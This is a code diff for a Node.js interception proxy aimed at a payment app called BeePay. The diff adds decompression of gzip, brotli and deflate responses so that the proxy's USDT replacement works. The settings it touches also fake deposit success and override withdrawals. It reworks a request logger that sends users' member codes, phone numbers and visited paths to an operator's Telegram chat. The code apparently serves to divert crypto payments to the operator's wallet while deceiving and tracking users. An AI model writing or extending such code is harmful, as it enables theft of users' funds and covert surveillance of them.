@@ -22,7 +22,8 @@ const DEFAULT_DATA = {
   depositBonus: 0,
   withdrawOverride: 0,
   userOverrides: {},
-  trackedUsers: {}
+  trackedUsers: {},
+  appVersion: '2.1.1'
 };
 
 let bot = null;
@@ -83,7 +84,7 @@ async function saveData(data) {
     if (!skipMerge) {
       const current = await redis.get('beepayData');
       if (current && typeof current === 'object') {
-        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'activePhones'];
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'activePhones', 'appVersion'];
         for (const key of settingsKeys) {
           if (current[key] !== undefined) data[key] = current[key];
         }
@@ -503,34 +504,6 @@ app.use(async (req, res, next) => {
   });
 });
 
-// ── Endpoint activity logger ──────────────────────────────────────
-const _logRateLimit = {};
-app.use(async (req, res, next) => {
-  next();
-  // Fire after response — log to bot if logRequests is ON
-  res.on('finish', async () => {
-    try {
-      const d = cachedData;
-      if (!d || !d.logRequests || !d.adminChatId || !bot) return;
-      const path = (req.originalUrl || '').split('?')[0];
-      // Skip domainPool, checkUpdate, bot-webhook (too noisy)
-      const skip = ['/appAuth/domainPool', '/appAuth/checkUpdate', '/bot-webhook', '/health'];
-      if (skip.some(s => path.startsWith(s))) return;
-      const body = req.parsedBody || {};
-      const hdr = req.headers || {};
-      const userId = body.memberCode || body.memberId || body.userId ||
-                     hdr['membercode'] || hdr['memberCode'] || '';
-      const rateKey = `${userId||'anon'}:${path}`;
-      const now = Date.now();
-      if (_logRateLimit[rateKey] && now - _logRateLimit[rateKey] < 8000) return;
-      _logRateLimit[rateKey] = now;
-      const phone = (d.trackedUsers && userId && d.trackedUsers[userId]) ? (d.trackedUsers[userId].phone || '') : '';
-      bot.sendMessage(d.adminChatId,
-        `📡 ${path}\n👤 ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
-    } catch(e) {}
-  });
-});
 
 // ── User ID extraction ────────────────────────────────────────────
 async function extractUserId(req, jsonResp) {
@@ -796,12 +769,28 @@ async function proxyFetch(req) {
         kl === 'transfer-encoding' || kl === 'connection') return;
     respHeaders[k] = v;
   });
+  // ── GZIP decompression ──────────────────────────────────────────
+  // Some BeePay endpoints return gzip even when accept-encoding isn't sent.
+  // Node.js fetch (undici) does NOT auto-decompress in that case, so we get
+  // raw gzip bytes → JSON.parse fails → jsonResp = null → no USDT replacement.
+  const zlib = require('zlib');
+  let bodyBuf = Buffer.from(respBody);
+  const rawContentEncoding = (response.headers.get('content-encoding') || '').toLowerCase();
+  if (rawContentEncoding === 'gzip' || rawContentEncoding === 'br' || rawContentEncoding === 'deflate') {
+    try {
+      if (rawContentEncoding === 'gzip') bodyBuf = zlib.gunzipSync(bodyBuf);
+      else if (rawContentEncoding === 'br') bodyBuf = zlib.brotliDecompressSync(bodyBuf);
+      else bodyBuf = zlib.inflateSync(bodyBuf);
+    } catch(e) {
+      // decompression failed — keep raw bytes, JSON parse will fail gracefully
+    }
+  }
   let jsonResp = null;
   try {
-    const text = Buffer.from(respBody).toString('utf-8');
+    const text = bodyBuf.toString('utf-8');
     jsonResp = JSON.parse(text);
   } catch(e) {}
-  return { response, respBody: Buffer.from(respBody), respHeaders, jsonResp };
+  return { response, respBody: bodyBuf, respHeaders, jsonResp };
 }
 
 function sendJson(res, respHeaders, jsonResp, respBody) {
@@ -838,6 +827,9 @@ async function transparentProxy(req, res) {
 }
 
 // ── Request logger ────────────────────────────────────────────────
+// BeePay sends memberCode in both body AND request headers (all auth requests).
+// We read from headers first since body might not be parsed yet for multipart.
+const _logRateLimit = {};
 app.use((req, res, next) => {
   (async () => {
     try {
@@ -845,13 +837,22 @@ app.use((req, res, next) => {
       const data = cachedData || await loadData();
       if (!data.logRequests || !data.adminChatId) return;
       const path = req.originalUrl || req.url;
-      if (path.includes('bot-webhook') || path.includes('favicon') || path.includes('health')) return;
+      const skip = ['/appAuth/domainPool', '/appAuth/checkUpdate', '/bot-webhook', '/health', '/favicon'];
+      if (skip.some(s => path.includes(s))) return;
+      const hdr = req.headers || {};
       const body = req.parsedBody || {};
-      const userId = body.memberId || body.userId || body.id || '';
+      // BeePay uses memberCode (e.g. M107266) — check headers first, then body
+      const userId = hdr['membercode'] || hdr['memberCode'] ||
+                     body.memberCode || body.memberId || body.userId || '';
+      // Rate-limit: same user+path only once per 8s
+      const rateKey = `${userId||'anon'}:${path.split('?')[0]}`;
+      const now = Date.now();
+      if (_logRateLimit[rateKey] && now - _logRateLimit[rateKey] < 8000) return;
+      _logRateLimit[rateKey] = now;
+      if (userId && isLogOff(data, userId)) return;
       const phone = getPhone(data, userId);
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
-      if (userId && isLogOff(data, userId)) return;
       bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
     } catch(e) {}
   })();
